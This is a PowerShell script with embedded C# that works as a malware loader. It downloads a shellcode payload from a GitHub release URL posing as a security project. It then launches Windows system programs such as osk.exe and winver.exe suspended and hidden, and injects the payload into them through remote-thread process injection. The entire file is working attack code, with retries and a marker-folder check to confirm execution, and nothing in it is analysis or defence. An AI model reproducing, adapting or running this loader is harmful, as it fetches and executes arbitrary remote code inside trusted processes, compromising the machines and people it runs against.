[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$PayloadUrl = "https://github.com/Desantpodtabyret/SecurutyCodex/releases/download/Security/123.bin"

$CSharpEngine = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class GhostEngine
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    static string[] targets = new string[] {
        @"C:\Windows\System32\colorcpl.exe",
        @"C:\Windows\System32\winver.exe",
        @"C:\Windows\System32\cttune.exe",
        @"C:\Windows\System32\osk.exe"
    };

    static string markerFolder = @"C:\Windows\Global\cook";
    static int waitTimeoutMs = 45000;
    static int checkIntervalMs = 2000;

    public static bool Inject(byte[] shellcode, ref string log)
    {
        foreach (string target in targets)
        {
            if (!File.Exists(target))
            {
                log += "[*] Skip (not found): " + target + "\n";
                continue;
            }

            log += "[*] Trying target: " + Path.GetFileName(target) + "\n";
            bool success = TryInjectTarget(target, shellcode, ref log);

            if (success)
            {
                log += "[+] SUCCESS: marker folder detected at " + markerFolder + "\n";
                return true;
            }
            else
            {
                log += "[-] Target failed healthcheck. Moving to next.\n";
            }
        }

        log += "[-] All targets exhausted. No marker folder created.\n";
        return false;
    }

    static bool TryInjectTarget(string target, byte[] shellcode, ref string log)
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        si.dwFlags = 0x00000001;
        si.wShowWindow = 0;

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool created = CreateProcess(target, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);

        if (!created)
        {
            log += "  [-] CreateProcess failed: " + Marshal.GetLastWin32Error() + "\n";
            return false;
        }

        log += "  [+] Process spawned | PID: " + pi.dwProcessId + "\n";

        try
        {
            IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            if (alloc == IntPtr.Zero)
            {
                log += "  [-] VirtualAllocEx failed: " + Marshal.GetLastWin32Error() + "\n";
                TerminateProcess(pi.hProcess, 0);
                return false;
            }

            int bytesWritten;
            if (!WriteProcessMemory(pi.hProcess, alloc, shellcode, shellcode.Length, out bytesWritten))
            {
                log += "  [-] WriteProcessMemory failed: " + Marshal.GetLastWin32Error() + "\n";
                TerminateProcess(pi.hProcess, 0);
                return false;
            }

            uint threadId;
            IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
            if (hThread == IntPtr.Zero)
            {
                log += "  [-] CreateRemoteThread failed: " + Marshal.GetLastWin32Error() + "\n";
                TerminateProcess(pi.hProcess, 0);
                return false;
            }

            CloseHandle(hThread);
            ResumeThread(pi.hThread);
            log += "  [+] Shellcode running | TID: " + threadId + "\n";

            log += "  [*] Waiting for marker folder (" + waitTimeoutMs/1000 + "s timeout)...\n";

            int waited = 0;
            uint exitCode = 0;  // FIXED: declare before loop
            bool markerAppeared = false;
            bool processDead = false;

            while (waited < waitTimeoutMs)
            {
                GetExitCodeProcess(pi.hProcess, out exitCode);
                if (exitCode != 259) // STILL_ACTIVE = 259
                {
                    processDead = true;
                    break;
                }

                if (Directory.Exists(markerFolder))
                {
                    markerAppeared = true;
                    break;
                }

                Thread.Sleep(checkIntervalMs);
                waited += checkIntervalMs;
            }

            if (markerAppeared)
            {
                log += "  [+] Marker detected after " + waited + "ms\n";
                return true;
            }
            else if (processDead)
            {
                log += "  [-] Process exited prematurely (exit code: " + exitCode + ")\n";
                return false;
            }
            else
            {
                log += "  [-] Timeout. Marker folder never appeared.\n";
                TerminateProcess(pi.hProcess, 0);
                return false;
            }
        }
        finally
        {
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
        }
    }
}
"@

Add-Type -TypeDefinition $CSharpEngine -Language CSharp

$shellcode = $null
$maxRetries = 3

for ($i = 1; $i -le $maxRetries; $i++) {
    try {
        $wc = New-Object System.Net.WebClient
        $shellcode = $wc.DownloadData($PayloadUrl)
        $wc.Dispose()
        Write-Output "[+] Payload loaded | $($shellcode.Length) bytes"
        break
    }
    catch {
        Write-Output "[*] Attempt $i/$maxRetries failed: $_"
        if ($i -eq $maxRetries) {
            Write-Output "[-] Download failed. Aborting."
            return
        }
        Start-Sleep -Seconds 2
    }
}

$log = ""
$success = [GhostEngine]::Inject($shellcode, [ref]$log)
Write-Output $log
if ($success) { Write-Output "[SUCCESS] Injection verified via marker." }
else { Write-Output "[FAILED] Marker folder not created." }
